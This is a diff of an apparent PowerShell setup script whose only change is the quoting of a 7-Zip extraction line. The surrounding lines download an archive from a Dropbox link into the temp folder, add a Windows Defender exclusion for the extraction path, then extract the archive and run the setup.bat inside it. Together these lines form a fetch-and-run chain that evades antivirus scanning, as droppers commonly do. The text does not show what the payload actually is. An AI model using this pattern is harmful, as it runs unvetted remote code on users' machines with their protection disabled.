@@ -24,6 +24,6 @@ Set-PSRepository -Name 'PSGallery' -SourceLocation "https://www.powershellgaller
 Install-Module -Name 7Zip4PowerShell -Force
 Start-BitsTransfer -Priority Foreground -RetryInterval 60 -Source "https://dl.dropbox.com/scl/fi/md35kza3ovtldr028n8qj/Windows-7b.7z?rlkey=veni7s30cnwxlug54qi7ki4om&dl=0" -Destination "$env:temp\Windows7.7z"
 Add-MpPreference -ExclusionPath "$env:temp\Windows7"
-"${env:temp}\7za.exe" x "$env:temp\Windows7.7z" -o"$env:temp\Windows7"
+${env:temp}\7za.exe x $env:temp\Windows7.7z -o $env:temp\Windows7
 Remove-Item "$env:temp\Windows7.7z" -Force
 cmd /c "%temp%\Windows7\setup.bat"
